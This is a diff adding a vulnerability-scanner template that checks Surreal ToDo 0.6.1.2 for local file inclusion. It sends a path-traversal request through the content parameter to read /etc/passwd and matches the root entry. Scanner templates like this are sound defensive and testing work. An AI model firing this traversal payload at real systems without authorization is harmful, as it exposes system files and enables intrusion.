@@ -1,0 +1,22 @@
+id: surrealtodo-lfi
+name: Surreal ToDo 0.6.1.2 - Local File Inclusion
+severity: high
+confidence: confirmed
+description: Surreal ToDo 0.6.1.2 is vulnerable to local file inclusion via index.php and the content parameter.
+reference: CWE-22
+tags:
+- surreal
+- lfi
+- edb
+- vuln
+requests:
+- method: GET
+  path: /index.php?content=../../../../../../../../etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - root:[x*]:0:0
+  - type: status
+    status:
+    - 200
+  condition: and
